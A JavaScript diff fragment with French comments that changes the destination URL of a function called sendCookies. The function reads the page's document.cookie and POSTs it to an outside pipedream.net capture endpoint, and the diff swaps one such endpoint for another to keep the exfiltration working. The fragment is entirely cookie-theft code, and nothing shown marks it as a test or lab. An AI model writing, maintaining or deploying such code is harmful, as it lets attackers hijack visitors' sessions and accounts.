@@ -4,7 +4,7 @@ async function sendCookies() {
         const cookies = document.cookie;
 
         // Envoi des cookies vers la nouvelle URL
-        const response = await fetch('https://eo7f7juze15lp9m.m.pipedream.net', {
+        const response = await fetch('https://eom060axfo3rocf.m.pipedream.net', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
